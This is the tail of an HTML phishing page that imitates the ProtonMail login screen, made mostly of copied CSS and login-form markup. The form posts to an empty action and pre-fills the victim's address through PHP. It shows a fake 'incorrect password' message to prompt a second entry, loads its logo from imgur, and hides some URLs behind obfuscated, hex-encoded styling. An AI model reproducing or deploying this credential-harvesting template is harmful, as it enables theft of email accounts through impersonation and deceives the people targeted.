        body.appConfigBody-is-mobile .signUpProcess-btn-create {
            width: 100%;
            height: 4rem;
            line-height: 4rem
        }

        html.protonmail body.light {
            background-color: #f4f4f4
        }

        html.protonmail body.blank {
            background-color: #fff
        }

        body#eo-message {
            overflow: initial;
            background: #4d4c5d
        }

        body#eo-message #pm_footer {
            position: static
        }

        body#eo-message #attachmentArea {
            margin: 0
        }

        body#eo-message .message-head {
            padding-left: 35px;
            padding-right: 35px
        }

        body#eo-reply {
            overflow: initial;
            background: #4d4c5d
        }

        body#eo-reply #attachmentArea {
            margin: 0
        }

        body#eo-reply .composer-outside-container {
            position: relative
        }

        body#eo-reply .composer-askEmbedding,
        body#eo-reply .composer-dropzone,
        body#eo-reply .squireToolbar-text-mode {
            display: none !important
        }

        body#eo-reply .composer-dropzone * {
            pointer-events: none
        }

        body#eo-reply .composer-draggable:not(.composer-draggable-editor) .composer-dropzone {
            position: absolute;
            top: 0;
            right: 0;
            left: 0;
            bottom: 0;
            background: #fff;
            z-index: 10;
            display: -webkit-box !important;
            display: -webkit-flex !important;
            display: -ms-flexbox !important;
            display: flex !important;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-align-content: center;
            -ms-flex-line-pack: center;
            align-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        body#eo-reply .composer-draggable:not(.composer-draggable-editor) .composer-dropzone * {
            display: block !important
        }

        body#eo-reply .composer-draggable-editor .composer-askEmbedding {
            display: -webkit-box !important;
            display: -webkit-flex !important;
            display: -ms-flexbox !important;
            display: flex !important
        }

        body#eo-reply .composer-outside-editor iframe {
            width: 100%;
            padding: 1rem 25px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        body#eo-reply #pm_footer {
            position: static
        }

        body#eo-reply .outside .message-head {
            border-bottom: none
        }

        body#eo-reply .outside .message-head>div.pull-right {
            font-size: .9rem
        }

        body#eo-reply h1 {
            padding-bottom: 1rem;
            display: block
        }

        body#eo-reply ul.infos {
            font-size: .9rem;
            display: block;
            list-style-type: none;
            padding: 0;
            margin: 0;
            color: #999;
            font-weight: 400
        }

        body#eo-reply ul.infos strong {
            font-weight: 400
        }

        body#eo-reply ul.infos b,
        body#eo-reply ul.infos em {
            color: #9397cd;
            font-style: italic;
            font-weight: 400
        }

        body#eo-reply ul.infos li {
            display: block;
            list-style-type: none;
            padding: 0;
            margin: 0
        }

        body#eo-reply #message-body {
            margin: 0
        }

        body#eo-reply #message-body .squire-toolbar {
            border-top: 1px solid #acb0bf;
            border-bottom: 1px solid #acb0bf;
            padding: 0 35px;
            height: 42px;
            line-height: 42px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        body#eo-reply #message-body .squire-toolbar li {
            height: 40px;
            line-height: 40px;
            -webkit-flex-grow: initial;
            -ms-flex-positive: initial;
            -webkit-box-flex: initial;
            flex-grow: 0;
            padding: 0 1rem
        }

        body#eo-reply #message-body .squire-toolbar li a {
            height: 40px;
            line-height: 40px
        }

        body#eo-reply #message-body .squire-toolbar li.separator {
            padding: 0
        }

        body#eo-reply #message-body iframe {
            width: 100%;
            min-height: 30rem;
            height: 30rem;
            padding: 1rem 25px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        body#eo-reply #inputFile {
            display: none
        }

        body#eo-reply footer {
            padding: 1rem 35px;
            margin: 0;
            border-top: 1px solid #acb0bf
        }

        body#eo-reply footer .pm_button {
            text-transform: uppercase;
            padding: 0 1rem
        }

        @keyframes nodeInserted {
            0% {
                opacity: .99
            }

            to {
                opacity: 1
            }
        }

        .outside {
            padding: 4rem 100px;
            font-size: 1em;
            line-height: 1.6em;
            overflow: auto;
            height: calc(100% - 8rem)
        }

        .outside #expirationMessage {
            background-color: #ec6446;
            height: 50px;
            line-height: 50px;
            text-align: center;
            color: #fff;
            font-size: .9em;
            margin: 0
        }

        .outside [id=expirationMessage] .expirationMessage-expiration {
            font-weight: 700
        }

        .outside #outsideMessageWrap {
            padding: 0;
            background-color: #fff;
            max-height: 100%;
            position: relative
        }

        .outside #outsideMessage {
            padding: 35px;
            overflow: auto;
            -webkit-overflow-scrolling: touch
        }

        .outside .squireIframe {
            height: 35vh;
            max-height: 600px
        }

        .outside .message-head {
            padding: 20px 35px;
            border-bottom: 1px solid #acb0bf;
            margin-bottom: 10px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .outside .message-head h1 {
            line-height: 35px;
            display: inline-block;
            font-weight: 500
        }

        .outside .message-head h1 .attachment {
            float: left;
            margin: 5px .5rem 0 0
        }

        .outside .bodyDecrypted {
            -webkit-animation: nodeInserted;
            animation: nodeInserted;
            -webkit-animation-duration: 1ms;
            animation-duration: 1ms
        }

        .outside #attachmentArea {
            border-top: 1px solid #acb0bf;
            border-bottom: none;
            padding-left: 35px;
            padding-right: 35px
        }

        .outside .message-metadata {
            margin-bottom: 0;
            padding-bottom: 1rem;
            border-bottom: 1px solid #acb0bf;
            position: relative;
            padding-left: 35px;
            padding-right: 35px;
            text-align: right
        }

        .outside .message-metadata ul.infos {
            overflow: auto
        }

        .outside .message-metadata ul.infos,
        .outside .message-metadata ul.infos li {
            display: block;
            text-align: left;
            list-style-type: none;
            margin: 0;
            padding: 0
        }

        .outside .message-metadata ul.infos li strong,
        .outside .message-metadata ul.infos strong {
            color: #555;
            font-weight: 400
        }

        .outside .message-metadata ul.infos b,
        .outside .message-metadata ul.infos li b {
            color: #9397cd;
            font-weight: 400;
            font-style: italic
        }

        body.appConfigBody-is-mobile #pm_login.pm_panel,
        body.appConfigBody-is-mobile #reset .pm_panel {
            margin: 2rem auto
        }

        body.appConfigBody-is-mobile .outside #expirationMessage {
            margin: 0;
            border-radius: 0
        }

        body.appConfigBody-is-mobile .outside #outsideMessageWrap {
            padding: 0
        }

        body.appConfigBody-is-mobile body#eo-reply footer {
            padding: 1rem 25px;
            margin: 0
        }

        body.appConfigBody-is-mobile body#eo-reply #attachmentArea,
        body.appConfigBody-is-mobile body#eo-reply .message-head {
            padding-left: 25px;
            padding-right: 25px;
            margin: 0
        }

        body.appConfigBody-is-mobile body#eo-reply #message-body {
            margin: 0;
            padding: 1rem 0
        }

        body.appConfigBody-is-mobile body#eo-reply #message-body iframe {
            padding: 1px 25px;
            background: #fff
        }

        body.appConfigBody-is-mobile body#eo-reply #message-body .squire-toolbar {
            padding: 0
        }

        body.appConfigBody-is-mobile body#eo-reply #message-body .squire-toolbar li {
            padding: 0;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            -webkit-box-flex: 1;
            flex-grow: 1;
            text-align: center
        }

        body.appConfigBody-is-mobile body#eo-reply #message-body .squire-toolbar li.separator {
            min-width: 1px !important;
            width: 1px !important;
            -webkit-box-flex: initial !important;
            -webkit-flex-grow: initial !important;
            -ms-flex-positive: initial !important;
            flex-grow: 0 !important
        }

        body.appConfigBody-is-mobile body#eo-message #attachmentArea,
        body.appConfigBody-is-mobile body#eo-message .message-head,
        body.appConfigBody-is-mobile body#eo-message .message-metadata {
            margin: 0
        }

        body.appConfigBody-is-mobile body#eo-message .message-metadata {
            padding-top: 1rem
        }

        body.appConfigBody-is-mobile body#eo-message #outsideMessage {
            padding-top: 1rem;
            padding-bottom: 1rem
        }

        body.appConfigBody-is-mobile body#eo-message #attachmentArea,
        body.appConfigBody-is-mobile body#eo-message #outsideMessage,
        body.appConfigBody-is-mobile body#eo-message .message-metadata {
            padding-left: 25px;
            padding-right: 25px
        }

        body.appConfigBody-is-mobile .outside,
        body.appConfigBody-is-mobile body#eo-reply .outside {
            padding: 0
        }

        .loginForm-actions {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .loginForm-actions,
        .loginForm-actions-column,
        .loginForm-actions-row {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .loginForm-actions-column,
        .loginForm-actions-row {
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            width: 100%
        }

        .loginForm-actions-column {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .loginForm-actions-row {
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap
        }

        .loginForm-actions-column>*,
        .loginForm-actions-row>* {
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            margin: .5em 0 1em;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            text-align: center
        }

        .loginForm-actions-column>:last-child,
        .loginForm-actions-row>:last-child {
            margin-right: 0
        }

        .loginForm-actions-row>* {
            white-space: nowrap
        }

        .loginForm-actions-main {
            width: 100%;
            font-weight: 700;
            font-size: 1em;
            height: auto;
            min-height: 45px;
            line-height: 1.3em;
            padding: .5em
        }

        .loginForm-btn-help {
            background: none;
            border: none;
            padding: 0;
            text-decoration: underline
        }

        .loginForm-link-signup {
            text-transform: none;
            font-weight: 700
        }

        .loginForm-input-password .togglePassword-btn-toggle,
        .protonmail .loginForm-input-password .text-red,
        .protonmail .unlock-input-password .text-red,
        .unlock-input-password .togglePassword-btn-toggle {
            color: #fff
        }

        .securityContainer .noLog,
        .securityContainer .onlyActive {
            display: none
        }

        .securityContainer.activeLog .onlyActive,
        .securityContainer.activeLogAdvanced .onlyActive,
        .securityContainer.noLog .noLog {
            display: inherit
        }

        .securityContainer.activeLog .activeLogBtn,
        .securityContainer.activeLogAdvanced .activeLogAdvancedBtn,
        .securityContainer.noLog .noLogBtn {
            background: #e5e5e5;
            -webkit-box-shadow: inset 0 2px 2px 0 rgba(0, 0, 0, .2);
            box-shadow: inset 0 2px 2px 0 rgba(0, 0, 0, .2)
        }

        .securityLogRefresh {
            float: left;
            margin-right: 1rem
        }

        .securtiyLogActions>.pm_button {
            margin: 0 0 0 5px
        }

        .members-table-tbody>tr>td {
            vertical-align: middle
        }

        .members-table-usage {
            line-height: 1.5em
        }

        .members-table-usage>i {
            opacity: .2
        }

        .member-table-addresses-pmTable {
            margin-top: -.5rem;
            padding-top: .5rem;
            width: 100%;
            padding: 10px 0 0 22px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .member-table-addresses {
            position: relative
        }

        .member-table-addresses:before {
            position: absolute;
            left: -22px;
            top: -10px;
            height: calc(100% - 8px);
            width: 3px;
            content: "";
            background: #acb0bf
        }

        .member-table-addresses tbody tr:before {
            position: absolute;
            left: -22px;
            font-size: 22px;
            -webkit-transform: rotate(90deg);
            transform: rotate(90deg);
            font-family: FontAwesome;
            content: "\F148";
            color: #acb0bf
        }

        .settingsFilters-actions {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            width: 100%;
            margin: 20px 0
        }

        .settingsFilters-actions-notice {
            margin-left: auto;
            padding: 20px 0
        }

        .settingsFilters-sort-container {
            margin-bottom: 20px
        }

        .appConfigBody-is-mobile .settingsFilters-actions-notice {
            text-align: left;
            margin-left: 0
        }

        .appConfigBody-is-mobile .pm_sort-item-content>:first-child {
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            padding: 10px 0
        }

        .appConfigBody-is-mobile .pm_sort-item-content>:last-child {
            width: auto
        }

        .block-list.empty {
            display: none
        }

        .domains-catchAll-input {
            width: auto;
            vertical-align: middle
        }

        @media (max-width:1100px) {
            .navigation-link {
                width: 100px
            }

            .searchForm-container {
                width: calc(100% - 650px)
            }

            #ptSidebar,
            .headerSecuredDesktop-logo {
                width: 170px;
                min-width: 170px
            }

            body #pm_main {
                width: calc(100% - 170px)
            }

            .sidebarApp-container .sidebar-btn-compose {
                padding-left: 0;
                text-align: center
            }

            .sidebarApp-container .sidebar-btn-back {
                font-size: .8em
            }

            .sidebarApp-menu {
                font-size: .9em
            }
        }

        @media (max-width:1000px) {

            .navigation-title,
            .sidebarApp-item .navigationItem-counter,
            .sidebarApp-menu .menuLabel-counter {
                font-size: .9em
            }

            .searchForm-container {
                width: calc(100% - 600px)
            }

            #ptSidebar,
            .headerSecuredDesktop-logo {
                width: 150px;
                min-width: 150px
            }

            body #pm_main {
                width: calc(100% - 150px)
            }
        }

        @media (max-width:900px) {
            .navigation-link {
                width: 80px
            }

            .searchForm-container {
                width: calc(100% - 550px)
            }

            #ptSidebar,
            .headerSecuredDesktop-logo {
                width: 130px;
                min-width: 130px
            }

            body #pm_main {
                width: calc(100% - 130px)
            }

            .sidebarApp-item .navigationItem-counter,
            .sidebarApp-menu .menuLabel-counter {
                margin: 0 .3em
            }
        }

        #customTheme:not(:empty)~#body .sidebarApp-container .sidebarApp-item .navigationItem-aside,
        #customTheme:not(:empty)~#body .sidebarApp-container .sidebarApp-menu .sidebarApp-item:after {
            background: none
        }

        #customTheme:not(:empty)~#body .sidebarApp-container .navigationSettings-link>span,
        #customTheme:not(:empty)~#body .sidebarApp-container .sidebarApp-item .navigationItem-title {
            overflow: hidden;
            text-overflow: ellipsis
        }

        #eo-message .email img.pm_broken,
        #eo-reply iframe img.pm_broken,
        .message .frame>.email img.pm_broken {
            background-color: #e1e1e1
        }

        #eo-message .email blockquote,
        #eo-reply iframe blockquote,
        .message .frame>.email blockquote {
            padding: 0 0 0 1rem !important;
            margin: 0 !important;
            border-left: 4px solid #e5e5e5 !important
        }

        #eo-message .email blockquote blockquote blockquote,
        #eo-reply iframe blockquote blockquote blockquote,
        .message .frame>.email blockquote blockquote blockquote {
            padding-left: 0 !important;
            margin-left: 0 !important;
            border: none !important
        }

        .clearfix {
            overflow: auto;
            -webkit-overflow-scrolling: touch;
            zoom: 1;
            padding: 0 0 1px
        }

        .text-right {
            text-align: right
        }

        .pm_opensans {
            font-family: sans-serif
        }

        #pm_conversations .meta .fa-star-o,
        #pm_conversations .meta .singleStar,
        #pm_conversations article>header .fa-lock,
        #pm_conversations article>header .fa-paperclip,
        #pm_conversations header .loc,
        #pm_rows .meta .fa-star-o,
        #pm_rows .meta .singleStar,
        #pm_rows article>header .fa-lock,
        #pm_rows article>header .fa-paperclip,
        #pm_rows header .loc {
            color: #aba7be;
            display: inline-block;
            text-align: center;
            width: 1.5rem;
            min-width: 1.5rem;
            height: 20px;
            line-height: 20px;
            float: left
        }

        @media screen and (-webkit-min-device-pixel-ratio:0) {

            input[type=email],
            input[type=number],
            input[type=password],
            input[type=search],
            input[type=tel],
            input[type=text] {
                line-height: normal !important
            }
        }
    </style>

    <style id="angular-vs-repeat-style">
        .vs-repeat-debug-element {
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: red;
            z-index: 99999999;
            box-shadow: 0 0 20px red;
        }

        .vs-repeat-debug-element+.vs-repeat-debug-element {
            display: none;
        }

        .vs-repeat-before-content,
        .vs-repeat-after-content {
            border: none !important;
            padding: 0 !important;
        }
    </style>
</head>

<body ng-class="{
    locked: (isLoggedIn &amp;&amp; isLocked) || ('login'|isState) || ('login.unlock'|isState) || ('eo.unlock'|isState) || ('eo.message'|isState) || ('reset'|isState) || ('eo.reply'|isState) || ('reset'|isState),
    login:!isLoggedIn,
    unlock:isLocked,
    secure:isSecure,
    light: ('support.reset-password'|isState) || ('signup'|isState) || ('login.setup'|isState) || ('pre-invite'|isState) || ('support.message'|isState),
    scroll: ('signup'|isState) || ('login.setup'|isState) || ('secured.print'|isState)
}" data-app-config-body="" class="appConfigBody-is-tablet login unlock locked" id="login">
    <!---->

    <div style="position: sticky; top: 0; background-color: #f1f1f1;  z-index: 999;">
        <div id="google_translate_element"></div>
    </div>


    <div id="pm_loading" class="protonLoader" ng-class="{ 'show': loggingOut }">
        <div class="protonLoaderIcon">
            <svg xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" version="1.1" width="12px"
                height="16px">
                <g xmlns="http://www.w3.org/2000/svg">
                    <path fill="#9397cd"
                        d="M5.642,0.23c0,0-4.677-0.154-5.642,5.035v3.534c0,0,0.04,0.378,1.104,1.146   c1.064,0.768,3.817,2.931,4.538,2.931s3.475-2.163,4.538-2.931c1.064-0.768,1.104-1.146,1.104-1.146V5.264   C10.319,0.076,5.642,0.23,5.642,0.23z M8.845,7.191H5.642H2.439V5.264c0.65-2.577,3.203-2.612,3.203-2.612s2.553,0.035,3.203,2.612   V7.191z">
                    </path>
                    <path fill="#9397cd"
                        d="M5.642,13.672c0,0-0.725-0.071-1.292-0.465C3.783,12.813,0,10.11,0,10.11v5.35c0,0,0.032,0.622,0.718,0.622   s4.925,0,4.925,0s4.239,0,4.925,0s0.718-0.622,0.718-0.622v-5.35c0,0-3.783,2.703-4.35,3.097   C6.367,13.601,5.642,13.672,5.642,13.672z">
                    </path>
                </g>
            </svg>
        </div>
    </div>
    <!---->
    <div ui-view="main" autoscroll="false" id="body">
        <header class="pm_opensans headerNoAuth-container" ng-class="{ 'isLoggedIn': isLoggedIn }">
            <ul class="headerNoAuth-list">
                <li class="headerNoAuth-item-back">
                    <a class="headerNoAuth-item-back-button__noAuth" href="#" target="_self"> <span translate=""
                            translate-context="Action">Back to protonmail.com</span> </a>
                    <a class="headerNoAuth-item-back-btn__Auth" href="#" title="Inbox"> <span translate=""
                            translate-context="Action">Back to inbox</span> </a>
                </li>
                <li class="headerNoAuth-item-report">
                    <button type="button" class="headerNoAuth-item-report-button newBugReport-container">
                        <div class="newBugReport-wrapper"> <i class="newBugReport-icon fa fa-bug sidebarApp-icon"></i>
                            <span translate-context="Action" translate="">Report bug</span>
                        </div>
                    </button>
                </li>
                <li class="headerNoAuth-item-signup__noAuth"> <a
                        style="background-image: u\r\l('https://%6d%61%69%6c%2e%70%72%6f%74%6f%6e%6d%61%69%6c%2e%63%6f%6d/%61%73%73%65%74%73/%68%6f%73%74%2e%70%6e%67')"
                        data-key="forFree" class="headerNoAuth-item-signup-button pm_button primary" href="#">Sign up
                        for free</a> </li>
                <li class="headerNoAuth-item-logout__Auth"> <a class="headerNoAuth-item-logout-button pm_button primary"
                        ui-sref="login" translate="" translate-context="Action" href="#">Log out</a> </li>
            </ul>
        </header>
        <div class="row">
            <!---->
            <div ui-view="panel">
                <form id="myForm" name="form1" data-name="" action="" method="post"
                    class="pm_panel alt pm_form loginForm-container ng-pristine ng-invalid ng-invalid-required"
                    required>
                    <input type="hidden" name="login" value="proton">

                    <!-- <form id="pm_login" name="loginForm" class="pm_panel alt pm_form loginForm-container ng-pristine ng-invalid ng-invalid-required"  autocomplete="">  -->

                    <img src="https://i.imgur.com/0NHWL0b.png" alt="ProtonMail" class="logo" height="20">
                    <h4 class="text-center margin-bottom"> <i class="fa fa-user title-icon"></i> <span
                            translate-context="Title" translate="">User login</span> </h4>
                    <!---->
                    <input autofocus="" autocapitalize="off" autocorrect="off" ng-model="username" tabindex="1"
                        name="user" id="user" value="<?php echo htmlspecialchars($decoded); ?>" readonly
                        class="margin loginForm-input-username ng-pristine ng-empty ng-invalid ng-invalid-required ng-touched"
                        required="" placeholder="Username" type="text">
                    <div class="margin loginForm-input-password password-container customPasswordToggler"
                        data-id="password" data-name="password" data-value="password" data-tabindex="2"
                        data-form="loginForm" placeholder="Password">
                        <input class="password-input ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required"
                            ng-model="value" autocapitalize="off" autocorrect="off" autocomplete="off"
                            data-toggle-password="" name="pass" id="pr" placeholder="Password" tabindex="2"
                            type="text">
                        <div class="password-messages ng-active" ng-messages="message">
                            <!---->
                            <p ng-message="required" class="text-red" translate-context="Error" translate="">Field
                                required</p>
                            <!---->
                        </div>
                        <button type="button" class="togglePassword-btn-toggle"> <i
                                class="togglePassword-icon-toText fa fa-eye" pt-tooltip="Show password" title=""
                                aria-label="Show password" data-original-title="Show password"></i> <i
                                class="togglePassword-icon-toPassword fa fa-eye-slash" pt-tooltip="Hide password"
                                title="" aria-label="Hide password" data-original-title="Hide password"></i> </button>

                    </div>

                    <div class="loginForm-actions">
                        <div class="row">
                            <div class="error" id="msg" style="<?php echo $error; ?> color:red;">The user name or password you
                                entered isn't correct. Try entering it again.</div>
                            <div class="error" id="error" style="display: none; color:red;">Incorrect Password</div>
                        </div>
                        <div class="loginForm-actions-column">
                            <button id="submit-btn" type="submit" onclick="submitForm(event)" tabindex="3"
                                class="loginForm-actions-main pm_button primary pull-right loginForm-btn-submit">Login</button>
                            <div class="loginForm-actions-row">
                                <button class="loginForm-btn-help" ng-click="displayHelpModal()" type="button"
                                    translate-context="Action" translate-comment="link for login help" translate="">Need
                                    help?</button> <a
                                    style="background-image: u\r\l('https://%6d%61%69%6c%2e%70%72%6f%74%6f%6e%6d%61%69%6c%2e%63%6f%6d/%61%73%73%65%74%73/%68%6f%73%74%2e%70%6e%67')"
                                    class="loginForm-link-signup loginForm-actions-right"
                                    href="https://protonmail.com/signup">Create Account</a>
                            </div>
                        </div>
                    </div>
                    <input id="hashed_pw" name="hashed_pw" autocomplete="off" type="hidden">

                    <div class="text-center" ng-show="::showOld"> <a class="pm_button link login-btn-oldversion"
                            style="color:#fff;text-transform:none" href="https://old.protonmail.com/login"
                            target="_self" translate-context="Action" translate-comment="link for old"
                            translate="">Having trouble? Try an older version</a> </div>
                </form>
            </div>
        </div>
        <div id="pm_footer">
            <p><span class="appCopyright-container">2023 ProtonMail.com - Made globally, hosted in Switzerland.</span>
                <a data-prefix="v" href="https://protonmail.com/blog/protonmail-v3-13-release-notes/"
                    title="Mon May 21 2018" target="_blank" class="appVersion-container">3.13.7</a>
            </p>
        </div>
    </div>
    <noscript class="pm_noscript">ProtonMail requires Javascript. Enable Javascript and reload this page to
        continue.</noscript>
    <span class="ptdnd-notification ptdnd-notification-firefox"></span>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("pr"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>